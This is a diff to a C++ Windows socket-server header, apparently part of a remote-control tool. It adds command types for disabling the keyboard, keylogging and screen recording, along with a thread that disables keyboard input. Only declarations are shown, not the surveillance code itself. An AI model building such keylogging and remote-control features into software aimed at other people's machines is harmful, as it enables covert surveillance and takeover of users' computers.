@@ -7,6 +7,8 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <tchar.h>
+#include <thread>
+#include <atomic>
 #pragma comment(lib, "ws2_32.lib")
 
 #include "./../WindowAPI/winAPI.hpp"
@@ -33,7 +35,10 @@ enum MessageType {
     TERMINATE_PROCESS,
     LIST_RUNNING_APP,
     LIST_INSTALLED_APP,
-    LIST_FILES
+    LIST_FILES,
+    DISABLE_KEYBOARD,
+    KEY_LOGGER,
+    SCREEN_RECORDING
 };
 
 class ServerSocket {
@@ -52,6 +57,15 @@ private:
     WinAPI winAPI;
 
     std::string response;
+
+
+    std::atomic<bool> isKeyboardDisabled;
+    
+    std::thread keyboardThread;
+
+    void disableKeyboardThread() {
+        winAPI.disableKeyboard();
+    }
 
 public:
     ServerSocket();
